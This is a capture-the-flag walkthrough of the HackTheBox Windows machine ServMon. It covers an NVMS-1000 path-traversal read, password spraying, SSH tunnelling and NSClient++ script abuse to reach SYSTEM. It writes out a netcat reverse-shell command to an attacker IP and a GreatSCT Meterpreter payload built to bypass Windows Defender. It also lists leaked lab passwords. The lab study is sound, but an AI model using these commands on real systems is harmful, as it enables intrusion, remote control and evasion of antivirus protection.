---
title: HackTheBox - ServMon
date: 2021-09-07 19:37:25 +0100
categories: [Hackthebox walkthroughs, Windows, Easy]
tags: [ftp, NVMS-1000, LFI, crackmapexec, ssh port forwarding, port forwarding, NSClient++, GreatSCT.py, Bypassing Defender, htb-windows-easy, writeup, oscp-prep]
image: /assets/img/htb/machines/windows/easy/servmon/ServMon.png
---

## Enumeration

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN ServMon-full-port-scan.txt 10.10.10.184
Warning: 10.10.10.184 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.184
Host is up (0.097s latency).
Not shown: 64161 closed ports, 1355 filtered ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|_    :Saturday
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: 3m23s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-07T10:52:14
|_  start_date: N/A
```

### Port 21 (FTP)

`nmap` revealed that Anonymous FTP login is allowed.

```bash
$ ftp $TARGET
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
ftp> 
```

There are two directories accessible via FTP:
- Nadine
- Nathan

Each of them contains a text file with sensible information:

- Nadine => `Confidential.txt`
- Nathan => `Notes to do.txt`

![](/assets/img/htb/machines/windows/easy/servmon/ftp_files.png)

According to these files, there is a `Passwords.txt` inside Nathan's Desktop and an application called NVMS offers a public access while they plan to remove it.  

### Port 80 (HTTP)

On port 80, there is a a login page for the **NVMS-1000** network surveillance software.

![](/assets/img/htb/machines/windows/easy/servmon/NVMS-1000.png)

After looking for exploits, we discover that it is vulnerable to LFI (**CVE-2019-20085**).

![](/assets/img/htb/machines/windows/easy/servmon/searchsploit.png)

![](/assets/img/htb/machines/windows/easy/servmon/47774.png)

Indeed and if we try to get the `Windows/win.ini` file, it shows up: 

![](/assets/img/htb/machines/windows/easy/servmon/LFI.png)

Now as we saw while enumerating FTP, there is a **Passwords.txt** file in Nathan's Desktop: 

![](/assets/img/htb/machines/windows/easy/servmon/Passwords.png)

It contains several passwords that we can use for brute-forcing/password spraying attacks:

- `1nsp3ctTh3Way2Mars!`
- `Th3r34r3To0M4nyTrait0r5!`
- `B3WithM30r4ga1n5tMe`
- `L1k3B1gBut7s@W0rk`
- `0nly7h3y0unGWi11F0l10w`
- `IfH3s4b0Utg0t0H1sH0me`
- `Gr4etN3w5w17hMySk1Pa5$`

___

## Foothold

### Password spraying

#### SMB (port 445)

```bash
$ crackmapexec smb $TARGET -u Users.txt -p Passwords.txt 
```

![](/assets/img/htb/machines/windows/easy/servmon/crackmapexec_smb.png)

#### SSH (port 22)

![](/assets/img/htb/machines/windows/easy/servmon/crackmapexec_ssh.png)

### Gaining access

**Nadine**'s password `L1k3B1gBut7s@W0rk` works for both SSH and SMB. Let's get a shell: 

![](/assets/img/htb/machines/windows/easy/servmon/ssh.png)

___

## Privesc

After basic enumeration, I couldn't get so much:

```cmd
nadine@SERVMON C:\Users\Nadine\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
nadine@SERVMON C:\Users\Nadine\Desktop>systeminfo
ERROR: Access denied
nadine@SERVMON C:\Users\Nadine>.\winPEASx64.exe
The system cannot execute the specified program.
```

### NSClient++

We can take a look at `NSClient++` source files (previously enumerated with `nmap` on port **8443**).

![](/assets/img/htb/machines/windows/easy/servmon/nsclient.png)

Because of the `allowed hosts` we cannot log in directly to the app:

![](/assets/img/htb/machines/windows/easy/servmon/403.png)

We need to create an SSH tunnel, so we can access it.

Furthermore, we can enumerate the software version using its binary `nscp.exe`:

```cmd
nadine@SERVMON C:\Program Files\NSClient++>.\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

### Port forwarding

```bash
$ ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184
```

And it worked:

![](/assets/img/htb/machines/windows/easy/servmon/port_forwarding.png)

We can log in using the password we found in `nsclient.ini`:

- **ew2x6SsGTxjRwXOT**

![](/assets/img/htb/machines/windows/easy/servmon/port_forwarding_success.png)

This web app contains functionality to create scripts that can be executed in the context of `NT AUTHORITY\SYSTEM`. 

### Exploitation

We will upload `nc.exe` to the target machine and then try to gain a reverse shell by executing it through the web app. 

```cmd
nadine@SERVMON C:\Users\Nadine\Desktop>curl 10.10.14.12/nc.exe -o nc.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 59392  100 59392    0     0  59392      0  0:00:01 --:--:--  0:00:01  137k
nadine@SERVMON C:\Users\Nadine\Desktop>echo C:\Users\Nadine\Desktop\nc.exe 10.10.14.12 443 -e cmd.exe > C:\Temp\shell.bat

nadine@SERVMON C:\Users\Nadine\Desktop>type C:\Temp\shell.bat
C:\Users\Nadine\Desktop\nc.exe 10.10.14.12 443 -e cmd.exe
```

Go to `Settings > External Scripts > Scripts` to add a new script as follows:

![](/assets/img/htb/machines/windows/easy/servmon/new_script.png)

Click on `Changes`, and `Save Configuration`:

![](/assets/img/htb/machines/windows/easy/servmon/save_conf.png)

Click on `Control`, and `Reload`:

![](/assets/img/htb/machines/windows/easy/servmon/reload.png)

Wait a little bit, log in again and go to `Queries`, your new command has been added:

![](/assets/img/htb/machines/windows/easy/servmon/queries.png)

Click on it and `Run`

![](/assets/img/htb/machines/windows/easy/servmon/run.png)

... And we were stopped by **Windows Defender Antivirus** which keeps removing `nc.exe` !

### Bypassing Defender with `GreatSCT.py`

A solution to ocvercome this issue is to use [GreatSCT](https://github.com/GreatSCT/GreatSCT) to generate a malicious DLL:

```bash
$ ./GreatSCT.py --ip 10.10.14.12 --port 443 -t bypass -p regsvcs/meterpreter/rev_tcp.py -o serv
```

![](/assets/img/htb/machines/windows/easy/servmon/great_scott.png)

Then we can run **metasploit** with the generated RC file:

```bash
$ msfconsole -r /usr/share/greatsct-output/handlers/serv.rc
```

After that, we have to transfer the `serv.dll` file using either `scp` or `wget` or whatever.

Finally, we have to change `C:\Temp\shell.bat`'s content:

```cmd
nadine@SERVMON C:\Temp> cmd /c "echo C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe C:\Temp\serv.dll > C:\Temp\shell.bat"
```

Go to `Console`, run **shell**, and you'll get this beautiful message: `Meterpreter session 1 opened` 

![](https://i.imgur.com/vRU0Fum.gif)

![](/assets/img/htb/machines/windows/easy/servmon/system.png)


___

## Useful links

- <https://nvd.nist.gov/vuln/detail/CVE-2019-20085>
- <https://eternallybored.org/misc/netcat/>
- [GreatSCT](https://github.com/GreatSCT/GreatSCT)